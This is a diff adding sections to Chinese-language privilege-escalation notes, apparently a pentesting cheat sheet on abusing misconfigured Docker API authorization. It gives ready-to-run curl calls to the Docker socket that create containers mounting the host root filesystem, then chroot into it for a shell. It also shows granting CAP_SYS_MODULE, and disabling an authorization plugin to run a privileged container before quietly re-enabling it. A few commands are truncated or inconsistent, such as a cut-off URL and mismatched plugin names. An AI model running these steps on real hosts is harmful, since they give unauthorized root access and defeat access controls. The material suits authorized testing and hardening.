@@ -737,3 +737,78 @@ Linux 机器中并非所有目录都支持 suid 位，为了检查哪些目录�
 
 如果可以挂载/etc或任何其他包含配置文件的文件夹，可以以 root 身份从 docker 容器更改它们，以便在主机中滥用它们并提升权限（可能修改 /etc/shadow）
 ---
+
+3.Docker API
+
+检查以下API
+
+[API](https://docs.docker.com/engine/api/v1.40/#)
+
+4.Json
+
+绑定在根目录：
+
+系统管理员在配置 docker 防火墙时可能会忘记API的一些重要参数
+
+以下示例中，可能会滥用此错误配置来创建并运行挂载主机根 (/) 文件夹的容器
+
+```Bash
+docker version  //首先，找到docker的API版本，本例中为1.40
+docker images  //列出可用的镜像
+# 然后，挂载主机根文件夹的容器
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
+docker start f6932bc153ad  //启动创建的特权容器
+docker exec -it f6932bc153ad chroot /host bash  //获取shell
+# 访问主机文件系统
+```
+
+绑定在HostConfig中：
+
+按照与以 root 身份绑定相同的指令向 Docker API 执行此请求
+```Bash
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
+```
+
+挂载在根目录:
+
+按照与以 root 身份绑定相同的指令向 Docker API 执行此请求
+```Bash
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
+```
+
+在 HostConfig 中挂载:
+
+按照与以 root 身份绑定相同的指令向 Docker API 执行此请求
+```Bash
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
+```
+
+5.Json属性
+
+当系统管理员配置 Docker 防火墙时，可能忘记设置 API 参数的一些重要属性，例如 HostConfig 中的 Capabilities 。
+
+在以下示例中，为滥用此错误配置来创建并运行具有 SYS_MODULE 功能的容器
+```Bash
+docker version
+curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
+docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
+docker ps
+docker exec -it c52a77629a91 bash
+capsh --print
+# 使用 SYS_MODULE 功能的容器吧
+```
+
+6.禁用插件
+
+如果系统管理员忘记禁止禁用插件的功能，可以利用此功能彻底禁用
+```Bash
+docker plugin list  //枚举插件
+
+# 如果无权枚举插件，可以在错误输出中查看插件名称
+docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
+# "authbolt" 是插件的名称
+
+docker plugin disable authobot
+docker run --rm -it --privileged -v /:/host ubuntu bash
+docker plugin enable authobot
+```
